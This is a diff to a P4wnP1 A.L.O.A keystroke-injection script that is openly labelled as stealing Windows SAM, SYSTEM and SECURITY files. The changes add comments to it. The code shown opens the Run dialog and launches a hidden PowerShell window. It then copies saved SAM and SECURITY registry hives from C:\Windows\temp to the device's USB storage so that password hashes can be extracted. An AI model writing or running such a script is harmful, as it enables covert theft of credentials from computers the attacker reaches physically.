@@ -1,3 +1,5 @@
+// stealing sam, system and security file with P4wnP1 A.L.O.A
+
 layout('us') // layout fr
 press("GUI r") // win r
 delay(200)
@@ -25,7 +27,7 @@ press("LEFT")
 press("ENTER")
 delay(1000)
 type("PowerShell.exe -windowstyle hidden { \n") // hide windows powershell
-type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'disk' } | select name\n")
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'disk' } | select name\n") // set variable to get UMS name
 type("cp C:\\Windows\\temp\\sam.save $usbPath.name\n")  // copy sam file to the ums of P4wnP1
 delay(400)
 type("cp C:\\Windows\\temp\\security.save $usbPath.name\n") // copy security file to the ums of P4wnP1
